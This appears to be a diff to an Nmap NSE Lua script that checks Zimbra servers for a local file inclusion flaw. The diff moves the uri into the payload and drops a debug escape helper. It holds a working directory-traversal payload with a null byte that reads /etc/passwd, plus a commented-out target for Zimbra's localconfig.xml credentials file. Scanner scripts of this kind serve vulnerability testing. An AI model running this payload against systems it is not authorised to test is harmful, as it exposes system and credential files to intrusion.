@@ -56,9 +56,6 @@ categories = {"exploit","vuln","intrusive"}
 
 portrule = shortport.http
 
--- function to escape specific characters
-local escape = function(str) return string.gsub(str, "%%", "%%%%") end
-
 action = function(host, port)
   local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/zimbra"
 
@@ -84,17 +81,12 @@ This issue was patched in Zimbra 7.2.6.
        },
      }
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
-  local payload = '/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../..'
+  local payload =  uri .. '/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../..'
   local file_short = "/dev/null"
   local file_long = "/etc/passwd"
   --local file_long = "/opt/zimbra/conf/localconfig.xml"
 
-  local url_short = payload .. file_short .. "%00"
-  local url_long = payload .. file_long .. "%00"
-
   stdnse.debug1("Trying to detect if the server is vulnerable")
-  stdnse.debug1("GET " .. uri .. escape(url_short))
-  stdnse.debug1("GET " .. uri .. escape(url_long))
 
   local status_short, _, contents_short = exploit.lfi_check(host, port, payload, file_short, nil, nil, "%00")
   local status_long, _, contents_long = exploit.lfi_check(host, port, payload, file_long, nil, nil, "%00")
